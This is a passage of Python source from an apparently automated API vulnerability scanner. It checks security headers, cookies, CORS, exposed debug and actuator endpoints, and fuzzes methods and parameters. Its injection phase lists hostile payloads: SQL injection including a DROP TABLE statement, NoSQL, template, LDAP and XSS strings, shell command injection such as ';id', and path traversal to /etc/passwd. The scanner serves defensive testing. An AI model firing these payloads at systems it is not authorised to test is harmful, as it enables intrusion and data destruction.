            url=base_url,
            detail="API does not set X-Content-Type-Options: nosniff.",
            evidence="X-Content-Type-Options: (absent)",
            remediation="Add 'X-Content-Type-Options: nosniff' to all responses.",
            extra={"command": _hdr_cmd},
        )
    if not hdrs.get("Referrer-Policy"):
        output.add_finding(
            phase="recon",
            title="Missing Security Header: Referrer-Policy",
            severity="LOW",
            url=base_url,
            detail="API does not set a Referrer-Policy header. URL parameters may leak to third parties via the Referer header.",
            evidence="Referrer-Policy: (absent)",
            remediation="Add 'Referrer-Policy: strict-origin-when-cross-origin' to all responses.",
            extra={"command": _hdr_cmd},
        )
    if not hdrs.get("Cache-Control"):
        output.add_finding(
            phase="recon",
            title="Missing Security Header: Cache-Control",
            severity="LOW",
            url=base_url,
            detail="API does not set a Cache-Control header. Sensitive responses may be cached by browser or proxy.",
            evidence="Cache-Control: (absent)",
            remediation="Add 'Cache-Control: no-store, no-cache' to sensitive endpoint responses.",
            extra={"command": _hdr_cmd},
        )

    # ── Permissive (misconfigured) security header checks ────────────────────
    _csp_val = hdrs.get("Content-Security-Policy", "")
    if _csp_val:
        _csp_l = _csp_val.lower()
        if "unsafe-inline" in _csp_l or "unsafe-eval" in _csp_l or (
            re.search(r"(?:default|script)-src[^;]*\*", _csp_l)
        ):
            output.add_finding(
                phase="recon",
                title="Permissive Security Header: Content-Security-Policy",
                severity="LOW",
                url=base_url,
                detail=(
                    "Content-Security-Policy is present but contains permissive directives "
                    f"(unsafe-inline, unsafe-eval, or wildcard sources): {_csp_val[:200]}"
                ),
                evidence=f"Content-Security-Policy: {_csp_val[:300]}",
                remediation="Remove 'unsafe-inline' and 'unsafe-eval'. Use nonces or hashes for inline scripts.",
                extra={"command": _hdr_cmd},
            )
    _hsts_val = hdrs.get("Strict-Transport-Security", "")
    if _hsts_val and _is_https:
        _ma_m = re.search(r'max-age\s*=\s*(\d+)', _hsts_val, re.I)
        _max_age = int(_ma_m.group(1)) if _ma_m else 0
        if _max_age < 31536000:
            output.add_finding(
                phase="recon",
                title="Permissive Security Header: Strict-Transport-Security",
                severity="LOW",
                url=base_url,
                detail=(
                    f"HSTS max-age ({_max_age}s) is below the recommended minimum of "
                    "31536000s (1 year), reducing SSL-stripping protection."
                ),
                evidence=f"Strict-Transport-Security: {_hsts_val}",
                remediation="Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
                extra={"command": _hdr_cmd},
            )
    _xfo_val = hdrs.get("X-Frame-Options", "")
    if _xfo_val and _xfo_val.upper().strip() not in ("DENY", "SAMEORIGIN"):
        output.add_finding(
            phase="recon",
            title="Permissive Security Header: X-Frame-Options",
            severity="LOW",
            url=base_url,
            detail=f"X-Frame-Options is set to a permissive value: '{_xfo_val}'. Only DENY or SAMEORIGIN provide clickjacking protection.",
            evidence=f"X-Frame-Options: {_xfo_val}",
            remediation="Set X-Frame-Options: DENY (or SAMEORIGIN if same-origin embedding is required).",
            extra={"command": _hdr_cmd},
        )
    _xcto_val = hdrs.get("X-Content-Type-Options", "")
    if _xcto_val and _xcto_val.strip().lower() != "nosniff":
        output.add_finding(
            phase="recon",
            title="Permissive Security Header: X-Content-Type-Options",
            severity="LOW",
            url=base_url,
            detail=f"X-Content-Type-Options is not set to 'nosniff': '{_xcto_val}'.",
            evidence=f"X-Content-Type-Options: {_xcto_val}",
            remediation="Set X-Content-Type-Options: nosniff",
            extra={"command": _hdr_cmd},
        )
    _rp_val = hdrs.get("Referrer-Policy", "")
    if _rp_val and _rp_val.strip().lower() in ("unsafe-url", "no-referrer-when-downgrade", ""):
        output.add_finding(
            phase="recon",
            title="Permissive Security Header: Referrer-Policy",
            severity="LOW",
            url=base_url,
            detail=f"Referrer-Policy is set to '{_rp_val}', which sends the full URL as referrer to third parties.",
            evidence=f"Referrer-Policy: {_rp_val}",
            remediation="Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer.",
            extra={"command": _hdr_cmd},
        )
    _cc_val = hdrs.get("Cache-Control", "")
    if _cc_val and "public" in _cc_val.lower() and "no-store" not in _cc_val.lower():
        output.add_finding(
            phase="recon",
            title="Permissive Security Header: Cache-Control",
            severity="LOW",
            url=base_url,
            detail=f"Cache-Control allows public caching ('{_cc_val}') without 'no-store'. Sensitive responses may be cached by intermediary proxies.",
            evidence=f"Cache-Control: {_cc_val}",
            remediation="Add 'Cache-Control: no-store, no-cache' to sensitive endpoint responses.",
            extra={"command": _hdr_cmd},
        )

    # ── Secure Cookie Attribute checks ───────────────────────────────────────
    _sc_list = []
    _raw_sc = hdrs.get("Set-Cookie", "")
    if _raw_sc:
        _sc_list = [_raw_sc]
    try:
        _all_sc = resp.raw.headers.getlist("Set-Cookie")
        if _all_sc:
            _sc_list = _all_sc
    except Exception:
        pass

    for _sc in _sc_list:
        if not _sc:
            continue
        _sc_lower = _sc.lower()
        _cname    = _sc.split("=")[0].strip() if "=" in _sc else _sc.split(";")[0].strip()
        _sc_ev    = f"Set-Cookie: {_sc[:300]}"
        _sc_owasp = "API8:2023 Security Misconfiguration"

        if "httponly" not in _sc_lower:
            output.add_finding(
                phase="recon",
                title="Missing Secure Cookie Attribute: HttpOnly",
                severity="LOW",
                url=base_url,
                detail=(
                    f"Cookie '{_cname}' does not have the HttpOnly attribute. "
                    "Without HttpOnly, the cookie is accessible to JavaScript, "
                    "exposing it to XSS-based theft."
                ),
                evidence=_sc_ev,
                remediation="Add the HttpOnly attribute to all session and authentication cookies.",
                extra={"command": _hdr_cmd, "owasp": _sc_owasp, "nist": "SC-23"},
            )

        if _is_https and "secure" not in _sc_lower:
            output.add_finding(
                phase="recon",
                title="Missing Secure Cookie Attribute: Secure",
                severity="LOW",
                url=base_url,
                detail=(
                    f"Cookie '{_cname}' does not have the Secure attribute on an HTTPS endpoint. "
                    "Without Secure, the cookie can be transmitted over unencrypted HTTP connections."
                ),
                evidence=_sc_ev,
                remediation="Add the Secure attribute to all cookies on HTTPS endpoints.",
                extra={"command": _hdr_cmd, "owasp": _sc_owasp, "nist": "SC-23"},
            )

        _ss_m = re.search(r'samesite\s*=\s*([^\s;,]+)', _sc_lower)
        if not _ss_m:
            output.add_finding(
                phase="recon",
                title="Missing Secure Cookie Attribute: SameSite",
                severity="LOW",
                url=base_url,
                detail=(
                    f"Cookie '{_cname}' does not have the SameSite attribute. "
                    "Without SameSite, the cookie is sent with all cross-site requests, "
                    "increasing CSRF risk."
                ),
                evidence=_sc_ev,
                remediation="Add SameSite=Lax or SameSite=Strict to all cookies.",
                extra={"command": _hdr_cmd, "owasp": _sc_owasp, "nist": "SC-23"},
            )
        else:
            _ss_val = _ss_m.group(1).strip()
            if _ss_val not in ("strict", "lax", "none"):
                output.add_finding(
                    phase="recon",
                    title="Misconfigured Secure Cookie Attribute: SameSite",
                    severity="LOW",
                    url=base_url,
                    detail=(
                        f"Cookie '{_cname}' has SameSite set to an unrecognised value "
                        f"'{_ss_val}'. Browsers will treat it as SameSite=None (no restriction)."
                    ),
                    evidence=_sc_ev,
                    remediation="Set SameSite to Strict, Lax, or None (with Secure).",
                    extra={"command": _hdr_cmd, "owasp": _sc_owasp, "nist": "SC-23"},
                )
            elif _ss_val == "none" and "secure" not in _sc_lower:
                output.add_finding(
                    phase="recon",
                    title="Misconfigured Secure Cookie Attribute: SameSite",
                    severity="LOW",
                    url=base_url,
                    detail=(
                        f"Cookie '{_cname}' has SameSite=None without the Secure attribute. "
                        "Browsers reject SameSite=None cookies that lack Secure, and the "
                        "cookie will be blocked or transmitted insecurely."
                    ),
                    evidence=_sc_ev,
                    remediation="Add the Secure attribute when using SameSite=None.",
                    extra={"command": _hdr_cmd, "owasp": _sc_owasp, "nist": "SC-23"},
                )

    # CORS wildcard check
    cors_tests = [
        ("Origin", "https://evil.com"),
    ]
    for hdr_name, hdr_val in cors_tests:
        test_resp = _safe_get(sess, base_url, timeout=timeout,
                              headers={hdr_name: hdr_val})
        if test_resp:
            acao = test_resp.headers.get("Access-Control-Allow-Origin", "")
            acac = test_resp.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "*":
                _acac_str = test_resp.headers.get("Access-Control-Allow-Credentials", "")
                _cred_note = " with credentials allowed" if _acac_str.lower() == "true" else ""
                output.add_finding(
                    phase="recon",
                    title="Security Misconfiguration / CORS Wildcard with Credentials",
                    severity="HIGH" if _acac_str.lower() == "true" else "MEDIUM",
                    url=base_url,
                    detail=f"API sets Access-Control-Allow-Origin: *{_cred_note}. Wildcard CORS allows any origin to read API responses.",
                    evidence=f"Access-Control-Allow-Origin: {acao}; Access-Control-Allow-Credentials: {_acac_str}",
                    remediation="Restrict CORS to an explicit allowlist of trusted origins; never combine wildcard with credentials.",
                )
            elif acao == "https://evil.com":
                sev = "HIGH" if acac.lower() == "true" else "MEDIUM"
                output.add_finding(
                    phase="recon",
                    title="CORS Misconfiguration Allowing Credential Leakage",
                    severity="HIGH",
                    url=base_url,
                    detail="The CORS policy reflects arbitrary origins or uses a wildcard origin combined with credentials-allowed, permitting malicious third-party sites to make credentialed cross-origin requests and read responses.",
                    evidence=f"Origin: https://evil.com → Access-Control-Allow-Origin: {acao}; Access-Control-Allow-Credentials: {acac}",
                    remediation="Maintain an explicit allowlist of trusted origins; never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true; and reject unexpected Origin headers.",
                )

    # Wildcard / catch-all detection
    _recon_wc = _detect_wildcard(base_url, sess, timeout)
    if _recon_wc is not None:
        output.add_finding(
            phase="recon",
            title=f"Wildcard (*) Detected: {base_url}",
            severity="INFO",
            url=base_url,
            detail=(
                f"A wildcard/catch-all response was detected — the server returns "
                f"HTTP {_recon_wc['status']} for all unknown paths"
                + (f", redirecting to {_recon_wc['location']}" if _recon_wc.get("redirect") else "")
                + ". Path-based discovery tools (FFUF, Feroxbuster, dirsearch) and fuzzing "
                "are unreliable on this host; results would be false positives."
            ),
            evidence=f"Wildcard: HTTP {_recon_wc['status']} for all paths",
            remediation="Return 404 for unknown routes. Do not expose catch-all handlers in production APIs.",
            output_file=str(_hdr_file),
        )

    # Framework / stack fingerprinting
    _FRAMEWORK_PATTERNS = [
        (re.compile(r'Django|django', re.I),    "Django (Python)"),
        (re.compile(r'Flask',          re.I),    "Flask (Python)"),
        (re.compile(r'FastAPI|fastapi', re.I),   "FastAPI (Python)"),
        (re.compile(r'Spring',         re.I),    "Spring Boot (Java)"),
        (re.compile(r'Tomcat|tomcat',  re.I),    "Apache Tomcat (Java)"),
        (re.compile(r'Express',        re.I),    "Express.js (Node)"),
        (re.compile(r'Laravel',        re.I),    "Laravel (PHP)"),
        (re.compile(r'Rails|rack',     re.I),    "Ruby on Rails"),
        (re.compile(r'ASP\.NET|aspnet',re.I),    "ASP.NET"),
        (re.compile(r'\bGin\b',         re.I),    "Gin (Go)"),
        (re.compile(r'Fiber\b',        re.I),    "Fiber (Go)"),
        (re.compile(r'Actix|actix',    re.I),    "Actix (Rust)"),
    ]
    all_header_vals = " ".join(str(v) for v in resp.headers.values())
    detected_frameworks = []
    for pat, name in _FRAMEWORK_PATTERNS:
        if pat.search(server) or pat.search(x_powered) or pat.search(all_header_vals):
            detected_frameworks.append(name)
    if detected_frameworks:
        output.add_finding(
            phase="recon",
            title="API Framework Identified",
            severity="INFO",
            url=base_url,
            detail=f"Framework fingerprint detected: {', '.join(detected_frameworks)}",
            evidence=f"Server: {server}  X-Powered-By: {x_powered}  Headers: {all_header_vals[:200]}",
            remediation="Remove version-revealing headers and error messages to reduce fingerprint surface.",
        )

    # Debug mode / verbose error detection
    con.status("recon", "running", "Debug mode and verbose error detection")
    _debug_paths = ["/debug", "/_debug", "/api/debug", "/console", "/api/console",
                    "/whoops", "/error", "/api/error", "/api/status/debug"]
    _debug_body_re = re.compile(
        r'Traceback \(most recent call last\)|StackTrace|<b>Fatal error</b>|'
        r'ActiveRecord::|undefined method|NameError|NoMethodError|'
        r'DEBUG\s*=\s*True|app\.debug\s*=\s*True|"debug"\s*:\s*true|'
        r'werkzeug\.debug|Werkzeug Debugger|Interactive Console|'
        r'django\.conf|settings\.DEBUG|DJANGO_SETTINGS_MODULE',
        re.I
    )
    for dpath in _debug_paths:
        if _shutdown_requested:
            break
        durl = base_url.rstrip("/") + dpath
        dr = _safe_get(sess, durl, timeout=timeout)
        if dr is not None and dr.status_code == 200 and _debug_body_re.search(dr.text[:4000]):
            output.add_finding(
                phase="recon",
                title="Debug / Developer Console Exposed",
                severity="HIGH",
                url=durl,
                detail=f"A debug or developer console endpoint is accessible at {durl}.",
                evidence=dr.text[:300],
                remediation="Disable debug mode in production. Remove debug/console endpoints.",
            )
            con.log(f"[recon] Debug endpoint exposed: {durl}", "SUCCESS")
            break

    # TRACE method detection
    con.status("recon", "running", "TRACE method detection")
    try:
        _trace_resp = sess.request("TRACE", base_url, timeout=timeout, allow_redirects=False)
        if _trace_resp is not None and _trace_resp.status_code in (200, 204):
            output.add_finding(
                phase="recon",
                title="TRACE Method Enabled (Cross-Site Tracing / XST)",
                severity="MEDIUM",
                url=base_url,
                detail=(
                    "The HTTP TRACE method is enabled on this API. "
                    "TRACE allows Cross-Site Tracing (XST) attacks that can be used to steal "
                    "HTTP-only cookies or authentication headers via XSS."
                ),
                evidence=f"HTTP TRACE returned {_trace_resp.status_code}; body[:200]: {_trace_resp.text[:200]}",
                remediation="Disable the HTTP TRACE method in your web server/proxy configuration.",
            )
    except Exception:
        pass

    # JSONP endpoint detection on common API paths
    con.status("recon", "running", "JSONP endpoint detection")
    _jsonp_probe_paths = ["/api", "/api/v1", "/api/v2", base_url.rstrip("/")]
    _jsonp_cb_re = re.compile(r'^siphon_jsonp_check\s*\(', re.M)
    for jpath in _jsonp_probe_paths:
        if _shutdown_requested:
            break
        jurl = jpath if jpath.startswith("http") else base_url.rstrip("/") + jpath
        for cb_param in ["callback", "cb", "jsonp", "jsoncallback"]:
            try:
                jr = sess.get(jurl, params={cb_param: "siphon_jsonp_check"},
                              timeout=timeout, allow_redirects=False)
                if jr is not None and jr.status_code == 200 and _jsonp_cb_re.search(jr.text[:500]):
                    output.add_finding(
                        phase="recon",
                        title="JSONP Endpoint Detected — Potential Data Leakage",
                        severity="MEDIUM",
                        url=jurl,
                        detail=(
                            f"The endpoint {jurl} supports JSONP via the '{cb_param}' parameter. "
                            "JSONP endpoints can leak authenticated data to attacker-controlled pages "
                            "because browsers do not enforce SOP for script tags."
                        ),
                        evidence=f"?{cb_param}=siphon_jsonp_check → {jr.text[:200]}",
                        remediation=(
                            "Replace JSONP with CORS. If JSONP must be kept, "
                            "validate the callback parameter against an allowlist and require authentication."
                        ),
                    )
                    con.log(f"[recon] JSONP endpoint: {jurl}?{cb_param}=...", "SUCCESS")
                    break
            except Exception:
                pass

    # Prometheus metrics / Spring Boot Actuator exposure
    con.status("recon", "running", "Metrics/actuator endpoint probing")
    _actuator_paths = [
        ("/metrics",              "Prometheus Metrics Endpoint Exposed",          "HIGH"),
        ("/actuator",             "Spring Boot Actuator Root Exposed",             "HIGH"),
        ("/actuator/env",         "Spring Boot Actuator /env Exposed",             "CRITICAL"),
        ("/actuator/mappings",    "Spring Boot Actuator /mappings Exposed",        "MEDIUM"),
        ("/actuator/health",      "Spring Boot Actuator /health Exposed",          "LOW"),
        ("/actuator/beans",       "Spring Boot Actuator /beans Exposed",           "MEDIUM"),
        ("/actuator/loggers",     "Spring Boot Actuator /loggers Exposed",         "MEDIUM"),
        ("/prometheus",           "Prometheus Metrics Endpoint Exposed",           "HIGH"),
        ("/admin/metrics",        "Admin Metrics Endpoint Exposed",                "HIGH"),
        ("/api/metrics",          "API Metrics Endpoint Exposed",                  "MEDIUM"),
    ]
    _prom_re = re.compile(r'# HELP |# TYPE |process_cpu_|jvm_|http_server_requests', re.I)
    for act_path, act_title, act_sev in _actuator_paths:
        if _shutdown_requested:
            break
        act_url = base_url.rstrip("/") + act_path
        ar = _safe_get(sess, act_url, timeout=timeout)
        if ar is None or ar.status_code not in (200, 206):
            continue
        body = ar.text[:1000]
        # For /metrics and /prometheus check for Prometheus format; for others just 200 is enough
        if "metrics" in act_path or "prometheus" in act_path:
            if not _prom_re.search(body):
                continue
        output.add_finding(
            phase="recon",
            title=act_title,
            severity=act_sev,
            url=act_url,
            detail=f"Sensitive internal endpoint {act_path} is publicly accessible.",
            evidence=f"HTTP {ar.status_code}; body[:300]: {body[:300]}",
            remediation=(
                "Restrict access to metrics and actuator endpoints to internal networks only. "
                "Require authentication for all management endpoints."
            ),
        )
        con.log(f"[recon] Actuator/metrics exposed: {act_url}", "SUCCESS")

    # API key / secret leakage in response headers
    con.status("recon", "running", "API key/secret header leakage detection")
    _secret_header_re = re.compile(
        r'^(X-API-Key|X-Auth-Token|X-Secret|Authorization|X-Internal-Key|'
        r'X-App-Secret|X-Service-Token|X-Master-Key|X-Admin-Token)$',
        re.I
    )
    leaked_headers = [h for h in resp.headers if _secret_header_re.match(h)]
    if leaked_headers:
        output.add_finding(
            phase="recon",
            title="Sensitive Authentication Headers Exposed in Response",
            severity="HIGH",
            url=base_url,
            detail=(
                f"The API response contains credential-related headers that should not appear "
                f"in responses: {', '.join(leaked_headers)}."
            ),
            evidence="; ".join(f"{h}: {resp.headers[h][:40]}" for h in leaked_headers),
            remediation=(
                "Remove authentication/credential headers from API responses. "
                "These should only appear in requests, not responses."
            ),
        )

    con.status("recon", "done", f"Server: {server or 'unknown'}")


# ---------------------------------------------------------------------------
# Phase 2: Fuzzing — HTTP method fuzzing + parameter fuzzing
# ---------------------------------------------------------------------------

_ALL_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
_COMMON_PARAMS = ["id", "user_id", "account_id", "admin", "debug",
                  "format", "callback", "jsonp", "token", "key", "api_key",
                  "page", "limit", "sort", "filter", "search", "q"]
_FUZZ_VALUES = ["1", "true", "admin", "null", "undefined", "0", "-1", "99999"]


def phase_fuzzing(settings: dict, sess: requests.Session,
                  output: OutputManager, inventory: list) -> None:
    """Phase 2: HTTP method and parameter fuzzing."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    # Wildcard check: if every path returns a response, fuzzing produces only
    # false positives — skip the entire phase.
    con.info("Fuzzing: probing for wildcard/catch-all behaviour …")
    _fuzz_wc = _detect_wildcard(root, sess, timeout)
    if _fuzz_wc is not None:
        con.warn(
            f"[fuzzing] Wildcard/catch-all detected (HTTP {_fuzz_wc['status']}) — "
            "skipping entire fuzzing phase to prevent false positives"
        )
        con.status("fuzzing", "skip", "Wildcard detected — fuzzing skipped")
        return

    con.status("fuzzing", "running", f"Fuzzing {len(inventory)} endpoints")

    endpoints_to_fuzz = inventory[:30]  # Cap to avoid excessive requests

    for ep in endpoints_to_fuzz:
        if _shutdown_requested:
            break
        path = ep["path"]
        url = root + path
        documented_methods = {ep["method"].upper()}

        # Method fuzzing: try undocumented methods
        for method in _ALL_METHODS:
            if method in documented_methods:
                continue
            resp = _safe_request(sess, method, url, timeout=timeout)
            if not resp:
                continue
            if resp.status_code not in (405, 404, 400, 501, 403):
                output.add_finding(
                    phase="fuzzing",
                    title="Undocumented HTTP Method Accepted",
                    severity="MEDIUM",
                    url=url,
                    detail=(f"Method {method} returned HTTP {resp.status_code} "
                            f"on endpoint documented as {ep['method']} only."),
                    evidence=f"{method} {url} -> {resp.status_code}",
                    remediation="Restrict allowed HTTP methods per endpoint.",
                )

        # Parameter fuzzing: inject common params not in spec
        documented_param_names = {p["name"] for p in ep.get("params", [])}
        fuzz_params = [p for p in _COMMON_PARAMS if p not in documented_param_names]
        for param in fuzz_params[:5]:  # limit per endpoint
            for val in _FUZZ_VALUES[:2]:
                test_url = f"{url}?{param}={val}"
                resp = _safe_get(sess, test_url, timeout=timeout)
                if resp and resp.status_code == 200:
                    # Check if response differs from baseline (param had effect)
                    base_resp = _safe_get(sess, url, timeout=timeout)
                    if (base_resp and
                            abs(len(resp.text) - len(base_resp.text)) > 100):
                        output.add_finding(
                            phase="fuzzing",
                            title="Undocumented Parameter Accepted",
                            severity="LOW",
                            url=test_url,
                            detail=(f"Parameter '{param}={val}' produced "
                                    f"different response (size diff: "
                                    f"{abs(len(resp.text) - len(base_resp.text))})."),
                            evidence=f"GET {test_url} -> {resp.status_code}",
                            remediation="Document all accepted parameters; reject unknown ones.",
                        )
                    break

    # FFUF parameter fuzzing on top endpoints
    tools_cfg = scan.get("tools", {})
    if tools_cfg.get("ffuf", True) and shutil.which("ffuf"):
        _ffuf_targets = [root + ep["path"] for ep in endpoints_to_fuzz
                         if ep.get("path") and ep["path"] != "/"][:10]
        for ep_url in _ffuf_targets:
            if _shutdown_requested:
                break
            _run_ffuf_params(ep_url, "fuzzing", scan, output, sess)

    con.status("fuzzing", "done", "Method, parameter, and FFUF fuzzing complete")


# ---------------------------------------------------------------------------
# Phase 3: Injection — SQLi, NoSQLi, SSTI, XXE, LDAP
# ---------------------------------------------------------------------------

_SQLI_PAYLOADS = [
    ("'", "single quote"),
    ("' OR '1'='1", "OR injection"),
    ("1' AND SLEEP(5)--", "time-based blind"),
    ("\" OR \"1\"=\"1", "double-quote OR"),
    ("1; DROP TABLE users--", "stacked query"),
]

_NOSQLI_PAYLOADS = [
    ('{"$ne": null}', "not-equal null"),
    ('{"$gt": ""}',   "greater-than empty"),
    ('{"$where": "1==1"}', "where clause"),
    ('[$ne]=1', "array not-equal"),
]

_SSTI_PAYLOADS = [
    ("{{7*7}}", "Jinja2/Twig"),
    ("${7*7}",  "FreeMarker/Velocity"),
    ("#{7*7}",  "Thymeleaf"),
    ("<%= 7*7 %>", "ERB"),
    ("*{7*7}", "Spring EL"),
]

_LDAP_PAYLOADS = [
    ("*)(|(uid=*)", "LDAP wildcard"),
    ("*)(uid=*))(|(uid=*", "LDAP injection"),
    ("admin*", "LDAP wildcard prefix"),
]


_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]

def _xss_confirmed(payload: str, resp) -> bool:
    """Return True only if payload appears in an executable HTML context.

    Eliminates false positives where the app reflects the payload safely:
      - URL reflected in an href/src/action attribute (URL kept as a link)
      - Payload HTML-encoded (browser won't execute it)
      - Payload only present in the request URL echo
    """
    import html as _html_mod
    from urllib.parse import unquote as _unquote, unquote_plus as _unquote_plus
    text = resp.text
    if payload not in text:
        return False

    # 1. If every occurrence is HTML-encoded, it's safe
    enc = _html_mod.escape(payload, quote=True)
    if enc != payload and enc in text:
        stripped = text.replace(enc, "")
        if payload not in stripped:
            return False

    # 2. Strip the request URL and its decoded variants (URL reflection)
    body = text
    for variant in (resp.url, _unquote(resp.url), _unquote_plus(resp.url)):
        body = body.replace(variant, "")

    # 3. Strip payload appearances inside URL attribute values
    _esc_pl = re.escape(payload)
    body = re.sub(
        r'(?:href|src|action|data(?:-[a-z][a-z0-9-]*)?)(?:\s*)=(?:\s*)["\'][^"\']*'
        + _esc_pl + r'[^"\']*["\']',
        '', body, flags=re.I
    )
    _url_enc_pl = quote(payload, safe='')
    if _url_enc_pl != payload:
        body = re.sub(
            r'(?:href|src|action)(?:\s*)=(?:\s*)["\'][^"\']*'
            + re.escape(_url_enc_pl) + r'[^"\']*["\']',
            '', body, flags=re.I
        )

    return payload in body

_CMD_PAYLOADS = [
    (";id",  re.compile(r'uid=\d+\(')),
    ("|id",  re.compile(r'uid=\d+\(')),
    ("&id",  re.compile(r'uid=\d+\(')),
    ("`id`", re.compile(r'uid=\d+\(')),
]
_CRLF_INJECTION_HEADER = "%0d%0aSiphon-Injected: test"
_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
]
_LFI_PARAMS = frozenset({
    "file", "page", "include", "path", "template", "view", "doc",
    "document", "load", "read", "content", "lang", "language", "module",
})
_TRAVERSAL_RE = re.compile(r'root:.*:/bin/|daemon:.*:/usr/sbin|Win\.ini|\[boot loader\]', re.I)


def _test_injection(sess: requests.Session, url: str, method: str,
                    param_name: str, payload: str, timeout: int) -> requests.Response | None:
    """Send injection payload via query param or JSON body."""
    try:
        if method in ("GET", "HEAD"):
            test_url = f"{url}?{quote(param_name)}={quote(payload)}"
            return sess.get(test_url, timeout=timeout)
        else:
            body = {param_name: payload}
            return sess.request(method, url, json=body, timeout=timeout)
    except Exception:
        return None


def _endpoint_dir_name(method: str, url: str) -> str:
    """Convert HTTP method + URL path to a filesystem-safe directory name.

    e.g. GET /api/v1/users → GET__api_v1_users
    """
    try:
        path = urlparse(url).path.strip("/") or "root"
    except Exception:
        path = "root"
    safe_path = re.sub(r'[^\w\-]', '_', path)
    return f"{(method or 'GET').upper()}__{safe_path}"[:80]


def _save_http_evidence(output: "OutputManager", phase: str, label: str,
                        r: "requests.Response", *,
                        endpoint_url: str = "", method: str = "") -> "tuple[str, str]":
    """Write HTTP request/response pair to the phase evidence directory.

    When endpoint_url is provided, files are placed in a per-endpoint
    subdirectory (METHOD__safe_path) and auto-indexed when the label already
    exists (label_01_request.txt, label_02_request.txt, …).

    Returns (request_file_path, response_file_path).
    """
    safe = re.sub(r'[^\w]', '_', label)[:60]

    if endpoint_url:
        _m = method or (r.request.method if r.request else "GET")
        ep_dir = output.out_dir / phase / _endpoint_dir_name(_m, endpoint_url)
        ep_dir.mkdir(parents=True, exist_ok=True)
        req_path  = ep_dir / f"{safe}_request.txt"
        resp_path = ep_dir / f"{safe}_response.txt"
        if req_path.exists():
            idx = 1
            while True:
                req_path  = ep_dir / f"{safe}_{idx:02d}_request.txt"
                resp_path = ep_dir / f"{safe}_{idx:02d}_response.txt"
                if not req_path.exists():
                    break
                idx += 1
    else:
        req_path  = output.output_path(phase, f"{safe}_request")
        resp_path = output.output_path(phase, f"{safe}_response")

    prep = r.request
    req_lines = [f"{prep.method} {prep.url}"]
    for k, v in (prep.headers or {}).items():
        req_lines.append(f"{k}: {v}")
    req_lines.append("")
    if prep.body:
        body = prep.body if isinstance(prep.body, str) \
               else prep.body.decode("utf-8", errors="replace")
        req_lines.append(body)
    req_path.write_text("\n".join(req_lines), encoding="utf-8")

    resp_lines = [f"HTTP/1.1 {r.status_code} {r.reason or ''}"]
    for k, v in r.headers.items():
        resp_lines.append(f"{k}: {v}")
    resp_lines.append("")
    resp_lines.append(r.text[:524288])
    resp_path.write_text("\n".join(resp_lines), encoding="utf-8")

    return str(req_path), str(resp_path)


def phase_injection(settings: dict, sess: requests.Session,
                    output: OutputManager, inventory: list,
                    auth_sess=None) -> None:
    """Phase 3: Injection testing — SQLi, NoSQLi, SSTI, XXE, LDAP."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("injection", "running", f"Testing injection on {len(inventory)} endpoints")

    # Cap endpoints tested
    test_endpoints = inventory[:20]

    for ep in test_endpoints:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", []) or []
        body_fields = ep.get("body_fields", []) or []

        # Collect testable parameters
        test_params = [p["name"] for p in params] + body_fields
        if not test_params:
            # Fuzz common params anyway
            test_params = ["id", "q", "search", "username", "user", "filter"]

        for param in test_params[:4]:  # cap per endpoint
            # SQLi
            for payload, desc in _SQLI_PAYLOADS[:3]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and _SQL_ERR_RE.search(resp.text):
                    _rq, _rp = _save_http_evidence(output, "injection", f"sqli_{param}", resp, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="SQL Injection (Error-Based)",
                        severity="CRITICAL",
                        url=url,
                        detail="User-controlled input is incorporated into SQL queries without parameterisation, allowing an attacker to read, modify, or delete database contents.",
                        evidence=f"Response snippet: {resp.text[:300]}",
                        output_file=f"{_rq},{_rp}",
                        remediation="Replace all dynamic SQL string construction with parameterised queries or prepared statements and suppress database error output in production responses.",
                    )
                    break

            # NoSQLi
            for payload, desc in _NOSQLI_PAYLOADS[:2]:
                try:
                    if method in ("GET", "HEAD"):
                        test_url = f"{url}?{param}={quote(payload)}"
                        resp = sess.get(test_url, timeout=timeout)
                    else:
                        # Try JSON operator injection
                        body = {param: {"$ne": None}}
                        resp = sess.request(method, url, json=body, timeout=timeout)
                    if resp and _NOSQL_ERR_RE.search(resp.text):
                        _rq, _rp = _save_http_evidence(output, "injection", f"nosql_{param}", resp, endpoint_url=url, method=method)
                        output.add_finding(
                            phase="injection",
                            title="NoSQL Injection",
                            severity="CRITICAL",
                            url=url,
                            detail="User-supplied input is incorporated into NoSQL query documents without type or operator validation, allowing an attacker to manipulate query logic and bypass authentication or exfiltrate data.",
                            evidence=f"Response snippet: {resp.text[:300]}",
                            output_file=f"{_rq},{_rp}",
                            remediation="Use parameterised query APIs or ODM/ORM frameworks that reject user-supplied operator tokens; enforce strict type validation on all inputs used in query construction.",
                        )
                        break
                except Exception:
                    pass

            # SSTI
            for payload, desc in _SSTI_PAYLOADS[:3]:
                resp = _test_injection(sess, url, method, param, payload, timeout)
                if resp and re.search(r'\b49\b', resp.text):
                    _rq, _rp = _save_http_evidence(output, "injection", f"ssti_{param}", resp, endpoint_url=url, method=method)
                    output.add_finding(
                        phase="injection",
                        title="Server-Side Template Injection (SSTI)",
                        severity="CRITICAL",
                        url=url,
